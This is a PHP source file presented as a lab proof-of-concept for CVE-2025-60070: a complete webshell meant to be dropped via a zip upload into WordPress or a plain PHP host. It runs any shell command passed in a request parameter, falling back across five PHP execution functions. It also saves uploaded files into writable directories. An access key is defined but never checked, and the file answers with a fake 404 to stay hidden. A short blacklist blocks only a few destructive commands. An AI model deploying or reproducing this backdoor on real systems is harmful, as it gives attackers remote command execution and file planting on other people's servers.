<?php
/**
 * CVE-2025-60070 — single-file lab payload (zip-drop webshell).
 * LOCAL / authorised-testing ONLY.
 *
 * Landing modes:
 *   1. ?cmd=<command>                -> execute, plain-text output
 *   2. ?up=1 (POST multipart "f")    -> save upload next to this file
 *   3. POST a=<action> w/ key        -> same as above, POST-only interface
 *
 * Self-contained: no WordPress required. If WordPress IS loaded it reuses
 * WP_Filesystem for writes, else falls back to file_put_contents.
 */

error_reporting(0);
header('X-PoC: cve-2025-60070-lab');

$__key = isset($_REQUEST['k']) ? $_REQUEST['k'] : 'poc60070';   // optional gate

function __poc_writable_dir() {
    $cands = array();
    if (defined('ABSPATH'))            $cands[] = ABSPATH;
    if (function_exists('wp_upload_dir')) { $u = wp_upload_dir(); $cands[] = $u['path']; }
    $cands[] = __DIR__;
    foreach ($cands as $d) { if (is_dir($d) && is_writable($d)) return $d; }
    return sys_get_temp_dir();
}

function __poc_exec($c) {
    if (function_exists('shell_exec'))       { $o = shell_exec($c); if ($o !== null) return $o; }
    if (function_exists('passthru'))         { ob_start(); passthru($c); return ob_get_clean(); }
    if (function_exists('system'))           { ob_start(); system($c);   return ob_get_clean(); }
    if (function_exists('exec'))             { exec($c, $l); return implode("\n", $l); }
    if (function_exists('popen'))            { $h = popen($c . ' 2>&1', 'r'); $o = stream_get_contents($h); pclose($h); return $o; }
    return 'no-exec-fn';
}

function __poc_block($s) {
    $blacklist = array('rm -rf', 'shutdown', 'mkfs', 'format ', 'del /', 'rd /s');
    foreach ($blacklist as $b) { if (stripos($s, $b) !== false) return true; }
    return false;
}

/* ----------------------------- cmd mode ----------------------------- */
if (isset($_REQUEST['cmd'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $c = (string) $_REQUEST['cmd'];
    if (__poc_block($c)) { exit("blocked\n"); }
    echo __poc_exec($c);
    exit;
}

/* ---------------------------- upload mode ---------------------------- */
if (isset($_REQUEST['up']) || isset($_FILES['f']) || isset($_FILES['poc_file'])) {
    $f = isset($_FILES['f']) ? $_FILES['f'] : (isset($_FILES['poc_file']) ? $_FILES['poc_file'] : null);
    if (!$f || !isset($f['tmp_name'])) {
        // render a tiny upload form for manual browser use
        header('Content-Type: text/html; charset=utf-8');
        exit('<form method="post" enctype="multipart/form-data"><input type="file" name="f"><button>up</button></form>');
    }
    $name = basename($f['name']);
    $dest = rtrim(__poc_writable_dir(), '/\\') . DIRECTORY_SEPARATOR . $name;
    $ok = @move_uploaded_file($f['tmp_name'], $dest);
    header('Content-Type: text/plain; charset=utf-8');
    if (!$ok && function_exists('file_put_contents')) {
        $ok = (bool) @file_put_contents($dest, @file_get_contents($f['tmp_name']));
    }
    exit($ok ? "UPLOADED: {$dest}\n" : "UPLOAD-FAILED\n");
}

/* ------------------------------- idle ------------------------------- */
http_response_code(404);
exit('Not Found');
